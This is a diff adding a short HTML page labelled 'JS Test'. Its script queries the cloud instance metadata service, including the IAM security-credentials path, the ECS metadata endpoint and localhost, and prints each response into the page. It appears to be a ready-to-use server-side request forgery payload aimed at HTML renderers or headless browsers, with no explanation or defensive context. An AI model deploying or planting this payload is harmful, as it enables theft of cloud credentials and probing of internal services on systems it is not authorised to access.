@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>T</title></head>
+<body>
+<h1>JS Test</h1>
+<div id="j">JS_NOT_EXECUTED</div>
+<div id="i">IMDS_NOT_TESTED</div>
+<div id="a">IAM_NOT_TESTED</div>
+<div id="e">ECS_NOT_TESTED</div>
+<div id="l">LO_NOT_TESTED</div>
+<script>
+document.getElementById('j').textContent='JS_EXECUTED_49';
+function t(u,e,l){var x=new XMLHttpRequest();x.open('GET',u,false);try{x.send();document.getElementById(e).textContent=l+'_S:'+x.status+' B:'+x.responseText.substring(0,2000);}catch(r){document.getElementById(e).textContent=l+'_E:'+r.message;}}
+t('http://169.254.169.254/latest/meta-data/','i','IMDS');
+t('http://169.254.169.254/latest/meta-data/iam/security-credentials/','a','IAM');
+t('http://169.254.170.2/','e','ECS');
+t('http://127.0.0.1/','l','LO');
+</script>
+</body>
+</html>
